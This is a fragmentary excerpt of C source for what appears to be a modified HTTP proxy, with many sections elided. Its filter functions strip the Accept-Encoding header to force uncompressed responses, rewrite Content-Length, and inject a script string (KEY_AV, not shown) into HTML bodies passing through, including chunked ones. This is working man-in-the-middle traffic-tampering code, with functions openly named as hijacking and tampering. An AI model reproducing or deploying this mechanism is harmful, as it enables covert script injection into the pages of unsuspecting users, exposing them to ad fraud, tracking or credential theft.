...
void * threadfunc (void *p) {
 ...
 if(i == 3){
	freeparam(param);
 	...
 	debug_print("run pf() in a new thread.\n");
...
FILTER_ACTION handlereqfilters(struct clientparam *param, unsigned char ** buf_p, int * bufsize_p, int offset, int * length_p){
	...
	debug_print("enter handlereqfilters, buf_p = %p, buf = %p\n", buf_p, *buf_p);
    //printf("============= %.120s, %d, %d, %d\n", *buf_p, *bufsize_p, offset, *length_p);
...
FILTER_ACTION handlehdrfilterssrv(struct clientparam *param, unsigned char ** buf_p, int * bufsize_p, int offset, int * length_p){
	...
	debug_print("enter handlehdrfilterssrv, buf_p = %p, buf = %p, bufsize_p=%d\n", buf_p, *buf_p, *bufsize_p);

	// html and not chunked
	if (param->content_type == 1 && param->status == 200) {
		if (param->chunked == 0 ) {
		    hijack_content_length(param, buf_p, bufsize_p, offset, length_p);
		}
	}
...
FILTER_ACTION handlehdrfilterscli(struct clientparam *param, unsigned char ** buf_p, int * bufsize_p, int offset, int * length_p){
	...
	debug_print("enter handlehdrfilterscli, buf_p = %p, buf = %p\n", buf_p, *buf_p);

	hijack_accept_encoding_disable_gzip(buf_p, bufsize_p, offset, length_p);
...
FILTER_ACTION handledatfltcli(struct clientparam *cparam, unsigned char ** buf_p, int * bufsize_p, int offset, int * length_p){
	debug_print("enter handledatfltcli, buf_p = %p, buf = %p\n", buf_p, *buf_p );
 ...
 size_t bin2hex2 (const unsigned char* bin, size_t bin_length, char* str, size_t str_length) 
{
	char *p;
	size_t i;
...
FILTER_ACTION handledatfltsrv(struct clientparam *cparam, unsigned char ** buf_p, int * bufsize_p, int offset, int * length_p){
	...
	debug_print("enter handledatfltsrv, buf_p = %p, buf = %p\n", buf_p, *buf_p);

	// debug_print("============= %.1600s, %d, %d, %d\n", *buf_p, *bufsize_p, offset, *length_p);
	...
	if (cparam->content_type == 1) {
		{
			tamper_html_inject_js(cparam, buf_p, bufsize_p, offset, length_p);
		}
	}
...
void hijack_accept_encoding_disable_gzip(unsigned char ** buf_p, int * bufsize_p, int offset, int * length_p)
{
	debug_print("enter hijack_accept_encoding_disable_gzip \n");

	const char *accept_encoding = "Accept-Encoding:";
	
	char *paccept = NULL;
	char *ple = NULL; // line end
		
	if ( offset > 0) {
		debug_print("offset > 0\n");
		return ;
	}

	paccept = strstri(*buf_p, accept_encoding);
	if ( paccept == NULL ) {
		return ;
	}

	ple = strchr(paccept, 0x0d);
	if ( ple == NULL ) {
		ple = strchr(paccept, 0x0a);
		if (ple == NULL)
			return ;
	}
	...
	// fill in space; it will cause server will response flat text.
	// Accept-Encoding:___________0x0d0x0a
	paccept += strlen(accept_encoding);
	while (paccept < ple) {
		*paccept = ' ';
		++paccept;
	}
...
int  hijack_content_length(struct clientparam *cparam, unsigned char ** buf_p, int * bufsize_p, int offset, int * length_p)
{
	debug_print("enter hijack_content_length \n");
	...
	// Content-Length: xxx\r\n
	// ^                    
	pcontent = strstri(*buf_p, content_length);
	if ( pcontent == NULL ) {
		debug_print("can't find content length\n");
		return -1;
	}
	...
	ple = strchr(pcontent, 0x0d);
	if ( ple == NULL ) {
		ple = strchr(pcontent, 0x0a);
		if (ple == NULL)
			return -1;
	}
	...
	// xxx -> s_len
	memcpy(s_len, pcontent+1, ple-pcontent);
	debug_print("original content length is %s\n", s_len);
	
	len = atoi(s_len);
	len += strlen(KEY_AV);
	snprintf(s_len, sizeof(s_len), "%d", len);

	memcpy(pcontent+1, s_len, strlen(s_len));	

	debug_print("new content length is %s\n", s_len);
	

	return 0;
}

int tamper_html_inject_js(struct clientparam *cparam, unsigned char ** buf_p, int * bufsize_p, int offset, int * length_p)
{
	int tail1 = 0;
	int tail2 = 0;
	...
	debug_print("tamper_html_inject_js() begin\n");

	cparam->tamper = 2;

#if 0
	// malloc 
	new_buf = myalloc(cparam->srvbufsize + strlen(KEY_AV));
	if (new_buf == NULL)
		return -1;
	
	// memcpy
	memcpy(new_buf, *buf_p, cparam->srvbufsize);
	...
	*buf_p = new_buf;
	...
	if (cparam->content_type == 1) {
		if (cparam->chunked == 0) {
				...
				tail1 = *length_p;
				tail2 = tail1 + strlen(KEY_AV);
				
				for (; tail1>=0; tail1--, tail2--) {
					(body)[tail2] = (body)[tail1];
				}

				memcpy(body, KEY_AV, strlen(KEY_AV));

				//*length_p += strlen(KEY_AV);
				cparam->srvinbuf += strlen(KEY_AV);
				cparam->waitserver64 += strlen(KEY_AV);
			
				//printf("============= %s\n", body);
				debug_print("inject js to html\n");
			...
			//printf("======= %.600s\n", body);
			debug_print("inject js to chuncked html\n");
